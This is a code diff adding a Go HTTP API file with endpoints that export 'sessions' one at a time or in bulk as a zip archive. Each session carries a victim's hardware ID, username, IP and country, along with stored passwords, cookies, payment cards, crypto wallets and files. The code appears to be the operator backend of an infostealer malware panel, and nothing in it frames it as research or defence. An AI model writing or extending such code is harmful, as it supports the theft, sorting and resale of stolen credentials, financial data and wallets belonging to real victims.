@@ -1,0 +1,134 @@
+package api
+
+import (
+	"archive/zip"
+	"bytes"
+	"database/sql"
+	"encoding/json"
+	"net/http"
+
+	"github.com/go-chi/chi/v5"
+)
+
+type ExportHandler struct {
+	db *sql.DB
+}
+
+func NewExportHandler(db *sql.DB) *ExportHandler {
+	return &ExportHandler{db: db}
+}
+
+func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
+	id := chi.URLParam(r, "id")
+
+	var s struct {
+		ID          string
+		BuildID     string
+		Hwid        string
+		Os          string
+		Username    string
+		Ip          string
+		CountryCode string
+		CreatedAt   string
+	}
+	err := h.db.QueryRow(`
+		SELECT id, build_id, hwid, os, username, ip, country_code, created_at
+		FROM sessions WHERE id = ?`, id).Scan(
+		&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
+		&s.Ip, &s.CountryCode, &s.CreatedAt,
+	)
+	if err == sql.ErrNoRows {
+		writeError(w, http.StatusNotFound, "session not found")
+		return
+	}
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "failed to fetch session")
+		return
+	}
+
+	resp := SessionDetailResponse{
+		ID:          s.ID,
+		BuildID:     s.BuildID,
+		Hwid:        s.Hwid,
+		Os:          s.Os,
+		Username:    s.Username,
+		Ip:          s.Ip,
+		CountryCode: s.CountryCode,
+		CreatedAt:   s.CreatedAt,
+		Passwords:   queryPasswords(h.db, id),
+		Cookies:     queryCookies(h.db, id),
+		Cards:       queryCards(h.db, id),
+		Wallets:     queryWallets(h.db, id),
+		Files:       queryFiles(h.db, id),
+		SystemInfo:  querySystemInfo(h.db, id),
+	}
+
+	writeJSON(w, http.StatusOK, resp)
+}
+
+func (h *ExportHandler) ExportBulk(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		IDs []string `json:"ids"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		writeError(w, http.StatusBadRequest, "invalid JSON")
+		return
+	}
+	if len(req.IDs) == 0 {
+		writeError(w, http.StatusBadRequest, "ids required")
+		return
+	}
+
+	var buf bytes.Buffer
+	zw := zip.NewWriter(&buf)
+
+	for _, id := range req.IDs {
+		resp := SessionDetailResponse{
+			Passwords:  queryPasswords(h.db, id),
+			Cookies:    queryCookies(h.db, id),
+			Cards:      queryCards(h.db, id),
+			Wallets:    queryWallets(h.db, id),
+			Files:      queryFiles(h.db, id),
+			SystemInfo: querySystemInfo(h.db, id),
+		}
+
+		var s struct {
+			ID, BuildID, Hwid, Os, Username, Ip, CountryCode, CreatedAt string
+		}
+		err := h.db.QueryRow(`
+			SELECT id, build_id, hwid, os, username, ip, country_code, created_at
+			FROM sessions WHERE id = ?`, id).Scan(
+			&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
+			&s.Ip, &s.CountryCode, &s.CreatedAt,
+		)
+		if err != nil {
+			continue
+		}
+		resp.ID = s.ID
+		resp.BuildID = s.BuildID
+		resp.Hwid = s.Hwid
+		resp.Os = s.Os
+		resp.Username = s.Username
+		resp.Ip = s.Ip
+		resp.CountryCode = s.CountryCode
+		resp.CreatedAt = s.CreatedAt
+
+		data, err := json.Marshal(resp)
+		if err != nil {
+			continue
+		}
+
+		f, err := zw.Create(id + ".json")
+		if err != nil {
+			continue
+		}
+		f.Write(data)
+	}
+
+	zw.Close()
+
+	w.Header().Set("Content-Type", "application/zip")
+	w.Header().Set("Content-Disposition", "attachment; filename=export.zip")
+	w.WriteHeader(http.StatusOK)
+	w.Write(buf.Bytes())
+}
